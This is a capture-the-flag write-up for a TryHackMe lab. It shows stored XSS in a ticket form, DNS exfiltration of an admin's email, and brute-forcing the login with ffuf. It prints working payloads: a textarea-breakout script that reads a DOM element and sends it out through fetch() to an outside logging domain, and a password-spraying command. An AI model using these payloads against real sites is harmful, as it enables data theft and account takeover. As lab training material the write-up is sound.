# 84 - That's The Ticket (XSS, DNS Exfilteration with XSS, Bruteforce Http Login forms with FFUF)

Room Link --> [https://tryhackme.com/room/thatstheticket](https://tryhackme.com/room/thatstheticket)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sC -sV -p- 10

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
{% endcode %}

We visit the main webpage, create a new account and login.

<figure><img src=".gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>

We can see the page is vulnerable to XSS

```
</textarea><script>alert(1)</script>
```

<figure><img src=".gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>

```
Hint: Our HTTP & DNS Logging tool on  may come in useful!
```

### Exploiting DNS Lookups <a href="#f8f9" id="f8f9"></a>

Using the found XSS bug we can use this to make callbacks to our machine and from the hint we got earlier. [http://10.10.10.100](http://10.10.10.100/) This is a DNS service that logs DNS calls for us. We can also use a site like this, [http://pingb.in/](http://pingb.in/)

Knowing we can use XSS let's try a call back to the DNS service.

{% code overflow="wrap" %}
```
</textarea><img src=http://0139bf8e80be1a183315890fcc0017f6.log.tryhackme.tech>
```
{% endcode %}

This gets the call back four times, 3 from us and once from the server (admin is looking)

<figure><img src="https://miro.medium.com/v2/resize:fit:481/0*btFJ-MTpEf3-u7oK.png" alt="" height="350" width="700"><figcaption></figcaption></figure>

Now let's try to get some data back!

I tried cookies for a while but realised we only needed the admin's email (always keep in mind the scope and spec!).

#### Exfilteration

* So, we must exfiltrate the admin's email via DNS lookups.
* We can fetch email from the innerHTML of the `email` DOM element.
* And then append the email as a subdomain. (Classic DNS exfiltration)!
  * **NOTE:** We need to replace the `@` and `.` characters in the email.
* Submit the following script as the ticket:

```markup
</textarea>
<script>
var email = document.getElementById("email").innerHTML;
email = email.replace('@', 'X');
email = email.replace('.', 'Y');
fetch('http://'+ email + '.c4af05d3cc694b47b3a742fcfa04f364.log.tryhackme.tech');
</script>
<textarea>
```

We see the admin email and ours!

Now we can brute force the login page for the admin's password as we have the email now.

<figure><img src=".gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

```
IT_Support Email : adminaccount@itsupport.thm
```

### Bruteforcing the Admin Password

Using FFUF

{% code overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/rockyou.txt  -d "email=adminaccount@itsupport.thm&password=FUZZ" -u http://10.10.8.153/login -fw 475 -H "Content-Type: application/x-www-form-urlencoded" 

123123
```
{% endcode %}

We got the password and the Flag.

Done!
